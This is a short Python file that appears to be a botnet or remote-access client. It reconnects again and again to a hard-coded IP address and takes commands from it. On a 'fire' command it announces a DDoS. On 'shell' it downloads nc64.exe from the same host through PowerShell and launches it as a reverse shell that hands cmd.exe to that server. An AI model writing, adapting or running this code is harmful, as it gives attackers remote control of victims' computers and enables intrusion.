import socket
import threading
import time
import os

def receive_messages(client_socket):
    while True:
        data = client_socket.recv(1024).decode()
        if not data:
            break

        print(f"Received from server: {data}")
        if data == 'fire':
            print("Starting DDoS")
        # Perform any action based on the received message
        if data == 'shell':
            try:
                os.system('powershell -command "Invoke-WebRequest -Uri \"http://143.42.5.48/nc64.exe\" -OutFile nc64.exe"')
                os.system('start nc64.exe 143.42.5.48 4444 -e cmd.exe')
            except Exception:
                print(f"Failed to start shell: {Exception.message}")

    print("Server connection closed.")
    client_socket.close()

def start_client():
    host = '143.42.5.48'
    port = 443

    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))

            print(f"Connected to {host}:{port}")

            # Start a thread to receive messages from the server
            receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
            receive_thread.start()

            receive_thread.join()  # Wait for the receive thread to finish

        except ConnectionRefusedError:
            print("Connection refused. Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    start_client()
